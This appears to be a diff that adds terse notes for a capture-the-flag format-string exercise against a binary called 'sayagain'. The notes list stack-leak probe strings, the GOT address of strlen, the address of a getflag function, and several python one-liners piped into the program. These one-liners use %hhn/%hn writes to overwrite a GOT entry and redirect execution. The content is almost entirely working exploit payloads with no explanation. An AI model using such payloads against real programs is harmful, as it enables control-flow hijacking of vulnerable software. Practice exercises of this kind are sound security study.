@@ -1,0 +1,15 @@
+aaaa.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08xzo
+aaaa.%4$08x
+0x2014
+strlen = 0804a01c
+getflag = 0804853b
+readelf -r sayagain | grep strlen
+-no-pie
+(python -c "print('aaaa%4\$08x')";)|./sayagain
+(python -c "print('\x46\x85\x04\x08\x47\x85\x04\x08\x48\x85\x04\x08%54c%4\$hhn%117c%5\$hhn%1016c%6\$hn')";)|./sayagain
+
+
+(python -c "print('\x18\xa0\x04\x08\x19\xa0\x04\x08\x1a\xa0\x04\x08%55c%4\$hhn%66c%5\$hhn%1919c%6\$hn')";)|./sayagain
+
+
+(python -c "print('\x1c\xa0\x04\x08\x1d\xa0\x04\x08\x1e\xa0\x04\x08%47c%4\$hhn%74c%5\$hhn%1919c%6\$hn')";)|./sayagain
